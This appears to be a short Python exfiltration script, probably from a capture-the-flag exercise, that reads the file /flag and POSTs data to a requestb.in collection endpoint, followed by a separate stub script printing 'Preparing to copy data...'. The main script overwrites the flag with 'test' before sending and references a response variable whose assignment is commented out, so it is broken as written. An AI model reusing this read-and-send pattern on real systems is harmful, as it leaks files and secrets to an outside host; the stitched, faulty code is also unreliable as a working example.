#!/usr/bin/python3

import http.client

content = open('/flag', 'r').read()
content = "test"
print(content)
conn = http.client.HTTPSConnection('requestb.in')
conn.request('POST', '/104r1yf1', content)
#response = conn.getresponse()
print(response.status)
print(response.getheaders())
print(response.read())

#!/usr/bin/python3

print("Preparing to copy data...")
